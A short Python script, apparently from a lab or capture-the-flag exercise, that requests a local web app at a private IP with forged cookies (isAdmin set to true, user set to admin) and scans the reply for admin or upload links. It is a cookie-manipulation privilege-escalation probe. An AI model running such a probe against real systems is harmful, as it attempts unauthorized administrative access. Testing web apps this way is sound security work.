import requests

target_home = "http://192.168.0.28:3000/"

# Manually setting the cookie to become admin
cookies = {
    'user': 'admin',
    'isAdmin': 'true', # Changed from false
    'user_id': '1'
}

print("Testing Cookie Manipulation (isAdmin=true)...")
res = requests.get(target_home, cookies=cookies)

print("Searching for admin links...")
found = False
for line in res.text.splitlines():
     if "href" in line:
         if "admin" in line.lower() or "upload" in line.lower():
             print(f"FOUND INTERESTING LINK: {line.strip()}")
             found = True

if not found:
    print("No obvious admin links found via grep. Checking full response content...")
    # Maybe the text is just "Admin" without a link containing "admin"?
    if "Admin" in res.text:
        print("Found text 'Admin' in page!")

